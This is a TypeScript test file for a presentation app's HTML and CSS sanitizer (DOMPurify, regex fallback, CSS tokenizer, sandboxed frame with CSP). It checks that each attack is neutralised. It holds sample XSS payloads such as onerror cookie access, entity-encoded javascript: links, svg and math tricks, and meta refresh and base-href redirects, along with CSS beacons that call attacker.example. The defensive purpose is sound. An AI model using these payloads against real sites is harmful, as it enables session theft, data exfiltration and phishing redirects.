// The `html` escape block's sanitizer (gslides-parity SPEC-3 0.27, 8.4; report 04 F4): the eight
// bypass payloads of the report inert through DOMPurify over jsdom and through the regular
// expression fallback, the CSS tokenizer's cases (@import, url() outside the deck, position:
// fixed, !important on z-index, @font-face), the style attribute allowlist, the link scheme, the
// write time stamp, and the frame document with its CSP.
import { afterAll, beforeAll, describe, expect, it } from 'vitest';

import DOMPurify from 'dompurify';
import { JSDOM } from 'jsdom';

import type { Block, BlockOf } from '@turboslide/schema/blocks';
import { isAllowedLink } from '@turboslide/schema/text';

import type { BlockContext } from '../blocks/context.ts';
import { renderHtmlEscape, sanitizeHtml, scopeCss } from '../blocks/html-escape.ts';
import { renderBlock } from '../blocks/render-block.ts';
import {
  sanitizeCss,
  sanitizeDeclaration,
  sanitizeStyleAttribute,
  urlsAllowed,
} from '../sanitize/css.ts';
import {
  buildFrameSource,
  frameCsp,
  frameDocument,
  frameThemeCss,
  htmlBlockPolicy,
  htmlFrameFor,
  noteDocument,
} from '../sanitize/frame.ts';
import {
  FORBIDDEN_TAGS,
  bindPurifier,
  createPurifier,
  loadPurifier,
  purifierNow,
  sanitizeHtmlBlock,
  sanitizeHtmlRegex,
  sanitizeMarkup,
} from '../sanitize/html.ts';

/** The eight payloads of report 04 F4, each with what must not survive. */
const PAYLOADS: { name: string; html: string; forbidden: RegExp[] }[] = [
  {
    name: '1 attribute separator: <img/src=x/onerror=...>',
    html: '<img/src=x/onerror=alert(document.cookie)>',
    forbidden: [/onerror/i],
  },
  {
    name: '2 entity encoded scheme',
    html: '<a href="jav&#x61;script:alert(1)">click</a><a href="&#106;avascript:alert(1)">two</a>',
    forbidden: [/href="jav/i, /href="&#106;/i, /javascript:/i],
  },
  {
    name: '3 form action and formaction',
    html: '<form action="javascript:alert(1)"><button>Continue</button></form><button formaction="javascript:alert(1)">x</button>',
    forbidden: [/<form/i, /formaction/i, /javascript:/i],
  },
  {
    name: '4 svg xlink:href with an entity encoded scheme',
    html: '<svg><a xlink:href="&#x6A;avascript:alert(1)"><text>x</text></a></svg>',
    forbidden: [/xlink:href="&#x6a;/i, /javascript:/i],
  },
  {
    name: '5 math maction',
    html: '<math><maction actiontype="statusline#http://x" xlink:href="javascript:alert(1)"><mi>x</mi></maction></math>',
    forbidden: [/<math/i, /<maction/i, /javascript:/i],
  },
  {
    name: '6 style element with @import and a fixed beacon',
    html: '<style>@import url("https://attacker.example/steal.css"); .x { position: fixed; background: url("https://attacker.example/b") }</style><div class="x">y</div>',
    forbidden: [/<style/i, /@import/i, /attacker\.example/i],
  },
  {
    name: '7 base href',
    html: '<base href="https://attacker.example/"><a href="https://ok.example/x">x</a>',
    forbidden: [/<base/i, /attacker\.example/i],
  },
  {
    name: '8 meta refresh',
    html: '<meta http-equiv="refresh" content="0;url=https://attacker.example/login"><p>hello</p>',
    forbidden: [/<meta/i, /attacker\.example/i],
  },
];

function context(extra: Partial<BlockContext> = {}): BlockContext {
  return {
    slideId: 's1',
    theme: 'light',
    blockAttrs: true,
    gtWord: true,
    image: () => undefined,
    assetUrl: (path) => `/decks/x/${path}`,
    slotWidth: 1326,
    slide: { kind: 'content' },
    rasters: [],
    warnings: [],
    rasterCount: 0,
    ...extra,
  };
}

const block = (html: string, css = ''): BlockOf<'html'> =>
  ({ id: 'ex', type: 'html', css, html, note: 'A table.' }) as BlockOf<'html'>;

describe('the parser sanitizer (DOMPurify over jsdom)', () => {
  beforeAll(() => {
    bindPurifier(createPurifier(DOMPurify(new JSDOM('').window), 'jsdom'));
  });
  afterAll(() => bindPurifier(null));

  for (const payload of PAYLOADS) {
    it(`leaves payload ${payload.name} inert`, () => {
      const out = sanitizeMarkup(payload.html);
      expect(out.parsed).toBe(true);
      expect(out.changed).toBe(true);
      for (const pattern of payload.forbidden) expect(out.html, payload.name).not.toMatch(pattern);
      // and through the block renderer, the page never sees it either
      const rendered = renderHtmlEscape(block(payload.html), context());
      for (const pattern of payload.forbidden) expect(rendered, payload.name).not.toMatch(pattern);
    });
  }

  it('keeps ordinary markup, deck asset images and https links, and passes style through the allowlist', () => {
    const html =
      '<div class="lay"><h3>Fixed</h3><img src="assets/site-home-light.jpg" data-dark="assets/site-home-dark.jpg" alt="x"><a href="https://ok.example/x">ok</a><p style="color: red; position: fixed; background: url(https://evil.example/x)">p</p></div>';
    const out = sanitizeMarkup(html);
    expect(out.html).toContain('<h3>Fixed</h3>');
    expect(out.html).toContain('src="assets/site-home-light.jpg"');
    expect(out.html).toContain('data-dark="assets/site-home-dark.jpg"');
    expect(out.html).toContain('href="https://ok.example/x"');
    expect(out.html).toContain('style="color: red"');
    expect(out.html).not.toContain('fixed');
    expect(out.html).not.toContain('evil.example');
    const clean = sanitizeMarkup('<div><p>hello</p></div>');
    expect(clean.changed).toBe(false);
    // a style attribute that loses everything is dropped
    expect(sanitizeMarkup('<p style="position: fixed">x</p>').html).toBe('<p>x</p>');
    for (const tag of FORBIDDEN_TAGS)
      expect(sanitizeMarkup(`<${tag}>x</${tag}>`).html).not.toContain(`<${tag}`);
  });

  it('stamps a block at write time and reports what changed', async () => {
    const dirty = block(
      '<div onclick="alert(1)">x</div>',
      '@import url("https://a.example/x.css"); .a { color: red; position: sticky }',
    );
    const result = await sanitizeHtmlBlock(dirty);
    expect(result.block.htmlSanitized).toBe(true);
    expect(result.block.html).toBe('<div>x</div>');
    expect(result.block.css).toBe('.a { color: red; }');
    expect(result.changed).toBe(true);
    expect(result.droppedCss).toEqual([
      '@import url("https://a.example/x.css")',
      '.a { position: sticky }',
    ]);
    const again = await sanitizeHtmlBlock(result.block);
    expect(again.changed).toBe(false);
  });
});

describe('the regular expression fallback (no parser loaded)', () => {
  it('still removes the script bearing parts of every payload', () => {
    bindPurifier(null);
    expect(purifierNow()).toBeNull();
    for (const payload of PAYLOADS) {
      const out = sanitizeHtmlRegex(payload.html);
      for (const pattern of payload.forbidden) expect(out, payload.name).not.toMatch(pattern);
    }
    const out = sanitizeMarkup('<div onclick="x">a</div>');
    expect(out.parsed).toBe(false);
    expect(out.html).toBe('<div>a</div>');
    expect(sanitizeHtml('<p>keep</p>')).toBe('<p>keep</p>');
  });

  it('loads the parser lazily and binds it once', async () => {
    bindPurifier(null);
    const purifier = await loadPurifier();
    expect(purifier.host).toBe('jsdom');
    expect(purifierNow()).toBe(purifier);
    expect(await loadPurifier()).toBe(purifier);
    bindPurifier(null);
  });
});

describe('the CSS tokenizer', () => {
  it('drops @import, @font-face and @namespace, foreign url(), fixed and sticky, !important on z-index, and keeps the rest', () => {
    const out = sanitizeCss(`
      /* a comment */
      @import url("https://attacker.example/steal.css");
      @font-face { font-family: X; src: url(https://attacker.example/x.woff2); }
      @namespace svg url(http://www.w3.org/2000/svg);
      .ts-x-s-b { position: fixed; inset: 0; z-index: 2147483647 !important; background: url("https://attacker.example/beacon?deck=1") }
      .lay { display: flex; gap: 8px; background: url(assets/site-home-light.jpg) }
      .pic { background-image: url("data:image/png;base64,AAAA") }
      .bad { width: expression(alert(1)); behavior: url(x.htc); -moz-binding: url(y.xml) }
      @media (min-width: 600px) { .lay { flex-direction: column } .fixed { position: sticky } }
    `);
    expect(out.css).not.toMatch(
      /@import|@font-face|@namespace|attacker\.example|fixed|sticky|expression|behavior|-moz-binding/,
    );
    expect(out.css).toContain('.ts-x-s-b { inset: 0; z-index: 2147483647; }');
    expect(out.css).toContain(
      '.lay { display: flex; gap: 8px; background: url(assets/site-home-light.jpg); }',
    );
    expect(out.css).toContain('.pic { background-image: url("data:image/png;base64,AAAA"); }');
    expect(out.css).toContain('@media (min-width: 600px) { .lay { flex-direction: column; } }');
    expect(out.css).not.toContain('.bad');
    expect(out.dropped.length).toBeGreaterThanOrEqual(8);
    expect(sanitizeDeclaration('color: red')).toBe('color: red');
    expect(sanitizeDeclaration('position: absolute')).toBe('position: absolute');
    expect(sanitizeDeclaration('position:fixed')).toBeNull();
    expect(urlsAllowed('url(assets/a.png), url("data:image/gif;base64,R0")')).toBe(true);
    expect(urlsAllowed('url(https://x.example/a.png)')).toBe(false);
    expect(urlsAllowed('url(/etc/passwd)')).toBe(false);
    expect(sanitizeStyleAttribute('color: red; position: fixed; top: 0')).toBe(
      'color: red; top: 0',
    );
    // a clean stylesheet is unchanged in substance, so the GT deck's escape blocks keep their pixels
    const clean = sanitizeCss('.lay { display: flex }\n.lay h3 { margin: 0 }');
    expect(clean.dropped).toEqual([]);
    expect(scopeCss(clean.css, '.ts-x-s-ex')).toContain(
      '.ts-sheet .ts-x-s-ex .lay { display: flex; }',
    );
  });
});

describe('the link scheme (SPEC-3 8.4 item 3, the schema)', () => {
  it('accepts https, http, mailto, tel and the slide forms, refuses javascript, data and entities', () => {
    for (const ok of [
      'https://a.example',
      'http://a.example',
      'mailto:a@example.test',
      'tel:+1',
      '#s/intro',
      '#next',
    ])
      expect(isAllowedLink(ok), ok).toBe(true);
    for (const bad of [
      'javascript:alert(1)',
      'data:text/html,x',
      'jav&#x61;script:alert(1)',
      'vbscript:x',
      'x/y',
      '',
    ])
      expect(isAllowedLink(bad), bad).toBe(false);
  });
});

describe('the frame document (SPEC-3 8.4 item 2)', () => {
  it('carries the default-src none policy, the theme variables, the scoped CSS and the resolved images', () => {
    bindPurifier(createPurifier(DOMPurify(new JSDOM('').window), 'jsdom'));
    try {
      const sheet =
        ".ts-sheet {\n  --paper: #ffffff;\n  --ink: #070707;\n}\n.ts-sheet[data-theme='dark'] {\n  --paper: #070707;\n  --ink: #ffffff;\n}\n.ts-sheet * {\n  box-sizing: border-box;\n}\n.ts-sheet .frame { border: 0 }";
      expect(frameThemeCss(sheet, 'light')).toBe(
        ':root {\n  --paper: #ffffff;\n  --ink: #070707;\n}\n* {\n  box-sizing: border-box;\n}',
      );
      expect(frameThemeCss(sheet, 'dark')).toContain('--ink: #ffffff');
      expect(frameCsp()).toBe(
        "default-src 'none'; img-src 'self' data:; style-src 'unsafe-inline'; font-src 'self' data:",
      );
      expect(frameCsp('abc.public.blob.vercel-storage.com')).toContain(
        "img-src 'self' data: https://abc.public.blob.vercel-storage.com",
      );
      const source = buildFrameSource(
        block(
          '<div class="lay"><img src="assets/site-home-light.jpg" data-dark="assets/site-home-dark.jpg" alt="x"><script>alert(1)</script></div>',
          '.lay { display: flex } @import url(https://x.example/a.css);',
        ),
        {
          theme: 'dark',
          assetUrl: (path) => `/decks/x/${path}`,
          sheetCss: sheet,
          slideId: 's1',
          slotHeight: 300,
        },
      );
      expect(source.height).toBe(300);
      expect(source.title).toBe('A table.');
      expect(source.srcdoc).toContain(
        "<meta http-equiv=\"Content-Security-Policy\" content=\"default-src 'none'; img-src 'self' data:; style-src 'unsafe-inline'; font-src 'self' data:\">",
      );
      expect(source.srcdoc).toContain('--ink: #ffffff');
      expect(source.srcdoc).toContain('.ts-sheet .ts-x-s1-ex .lay { display: flex; }');
      expect(source.srcdoc).toContain('src="/decks/x/assets/site-home-dark.jpg"');
      expect(source.srcdoc).not.toContain('<script');
      expect(source.srcdoc).not.toContain('@import');
      // the renderer emits the frame element with sandbox="" when the callback is set
      const rendered = renderBlock(
        block('<div>x</div>') as Block,
        context({ htmlFrame: htmlFrameFor({ theme: 'light', assetUrl: (path) => path }) }),
      );
      expect(rendered).toContain('<iframe class="ts-x-frame" sandbox=""');
      expect(rendered).toContain('srcdoc="');
      expect(rendered).not.toContain('<div>x</div>');
    } finally {
      bindPurifier(null);
    }
  });

  it('renders the note in a plate when the policy refuses the frame', () => {
    expect(htmlBlockPolicy({ sharedBeyondOwner: false, allowHtmlBlocks: false })).toBe('frame');
    expect(htmlBlockPolicy({ sharedBeyondOwner: true, allowHtmlBlocks: false })).toBe('note');
    expect(htmlBlockPolicy({ sharedBeyondOwner: true, allowHtmlBlocks: true })).toBe('frame');
    expect(
      htmlBlockPolicy({ sharedBeyondOwner: false, allowHtmlBlocks: true, flagOn: false }),
    ).toBe('note');
    const note = noteDocument(block('<b>x</b>'), 'light');
    expect(note).toContain('A table.');
    expect(note).not.toContain('<b>');
    const source = buildFrameSource(block('<b>x</b>'), {
      theme: 'light',
      assetUrl: (p) => p,
      policy: 'note',
    });
    expect(source.srcdoc).toContain('ts-x-note');
    expect(source.srcdoc).not.toContain('<b>x</b>');
    expect(
      frameDocument({ html: '<p>x</p>', css: '', scope: 'ts-x-a-b', theme: 'light' }),
    ).toContain('<div class="ts-sheet ts-x-a-b" data-theme="light"><p>x</p></div>');
  });
});
